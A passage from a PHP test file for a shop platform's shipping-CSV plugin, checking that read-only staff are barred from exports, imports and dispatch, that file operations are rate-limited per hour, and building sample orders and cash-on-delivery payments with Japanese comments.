        // 閲覧の段階の人は一覧と 1 件を見られるが、書き出し・取り込み・発送はできない
        $this->sessionId = null;
        $this->flushSession();
        $this->app['auth']->forgetGuards();
        [$staff] = $this->enrolledOperator('staff@example.com', 'staff');
        app(OperatorAccess::class)->grant($staff, 'sca', 'read', 'test');
        $this->send('GET', self::APP.'/records/'.$id)->assertOk();
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->assertForbidden();
        $this->upload('sca', strtoupper($a).",123456789012\n", 'yamato')->assertForbidden();
        $this->send('POST', self::APP.'/records/'.$id.'/actions/apply')->assertForbidden();
        $this->inside('sca', fn () => $this->assertSame(FulfillmentStatus::Pending, Fulfillment::query()->findOrFail($aBox)->status));
        $this->assertSame(0, AuditEvent::query()->where('type', 'operator.app_file_exported')->where('operator_id', $staff->id)->count());
    }

    public function test_exports_and_imports_are_limited_per_hour(): void
    {
        $this->enable('sca');
        $this->enrolledOperator();
        $this->order('sca');

        for ($i = 0; $i < AdminFiles::FILES_PER_HOUR; $i++) {
            $this->send('POST', self::APP.'/export', ['values' => ['format' => 'clickpost', 'target' => 'all']])->assertOk();
        }

        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'clickpost', 'target' => 'all']])->assertStatus(429);
        $this->upload('sca', "x,1\n", 'yamato')->assertStatus(429);
    }

    private function enable(string $shop): void
    {
        $this->inside($shop, fn () => app(PluginStates::class)->set('shipping-csv', true, 'test'));
    }

    /**
     * @return TestResponse<Response>
     */
    private function upload(string $shop, string $content, ?string $carrier): TestResponse
    {
        return $this->send('POST', "/api/tenants/{$shop}/apps/shipping-csv/imports", array_filter([
            'file' => UploadedFile::fake()->createWithContent('shipping.csv', $content),
            'values' => $carrier === null ? [] : ['carrier' => $carrier],
        ], static fn (mixed $v): bool => $v !== []));
    }

    /**
     * 物販の注文（$boxes 個の拠点から 1 点ずつ送る。届け先つき）
     *
     * @param  array<string, string>|null  $address  届け先の上書き。null はお届け先がまだ無い受渡（贈り物の受け取り待ち）
     * @param  ?DeliveryChoice  $delivery  お届けの日と時間帯の希望（ADR 0059）
     * @return array{0: string, 1: list<string>} 取引と受渡（作った順）
     */
    private function order(string $shop, bool $paid = true, int $boxes = 1, ?array $address = [], ?DeliveryChoice $delivery = null): array
    {
        return $this->inside($shop, function () use ($paid, $boxes, $address, $delivery): array {
            $seller = Seller::query()->firstOrFail();
            $listing = Listing::create(['seller_id' => $seller->id, 'kind' => 'product', 'title' => '帆布のトートバッグ', 'unit_amount' => 4400, 'status' => 'active']);
            $locations = [Location::query()->orderBy('id')->firstOrFail()];

            for ($i = 1; $i < $boxes; $i++) {
                $locations[] = Location::create(['seller_id' => $seller->id, 'name' => "倉庫 {$i}", 'kind' => 'warehouse']);
            }

            $drafts = [];

            foreach ($locations as $location) {
                app(StockService::class)->receive($listing, $location, 5);
                $drafts[] = LineDraft::fromListing($listing, 1, 1000, $location);
            }

            $customer = Party::create(['kind' => PartyKind::Customer, 'name' => '山田 花子']);
            $sale = app(TransactionService::class)->open('sale', $seller, $customer, $drafts, actor: 'test');
            $fulfillments = [];

            foreach ($sale->lines()->where('line_type', LineType::Item)->orderBy('position')->get() as $line) {
                $fulfillments[] = app(FulfillmentService::class)->create($sale, FulfillmentMethod::Shipping, [$line->id => 1], Location::query()->findOrFail($line->location_id), $address === null ? null : [...self::ADDRESS, ...$address], 'test', $delivery)->id;
            }

            if ($paid) {
                app(LedgerService::class)->recordPayment($sale, $sale->total_amount, PaymentRoute::Platform, 'pi_'.$sale->id, 'test');
                app(TransactionService::class)->transition($sale, Phase::Payment, 'test');
            }

            return [$sale->id, $fulfillments];
        });
    }

    /**
     * 代金引換の注文（ADR 0074）: 店が受け取る支払いの記録（入金待ち）があり、払う前に発送できる段。$paid なら入金を確かめた後
     *
     * @return array{0: string, 1: list<string>}
     */
    private function codOrder(bool $paid = false): array
    {
        [$sale, $boxes] = $this->order('sca', paid: false);
        $this->inside('sca', function () use ($sale, $paid): void {
            $transaction = Transaction::query()->findOrFail($sale);
            PaymentAttempt::create(['transaction_id' => $sale, 'provider' => 'direct', 'provider_ref' => 'direct-'.$sale, 'checkout_url' => '', 'amount' => (int) $transaction->total_amount,
                'currency' => 'JPY', 'status' => $paid ? 'paid' : 'awaiting', 'expires_at' => now(), 'kind' => 'direct', 'methods' => 'cod', 'method' => 'cod', 'paid_at' => $paid ? now() : null]);
            app(TransactionService::class)->transition($transaction, Phase::Payment, 'test');
        });

        return [$sale, $boxes];
    }

    /**
     * Shift_JIS の CSV を UTF-8 の表に
     *
     * @return list<list<string>>
     */
    private static function csv(string $body): array
    {
        $handle = fopen('php://temp', 'r+');
        assert($handle !== false);
        fwrite($handle, mb_convert_encoding($body, 'UTF-8', 'CP932'));
        rewind($handle);
        $rows = [];

        while (($cells = fgetcsv($handle, null, ',', '"', '')) !== false) {
            $rows[] = array_map(static fn (?string $c): string => (string) $c, $cells);
        }

        fclose($handle);

        return $rows;
    }
}
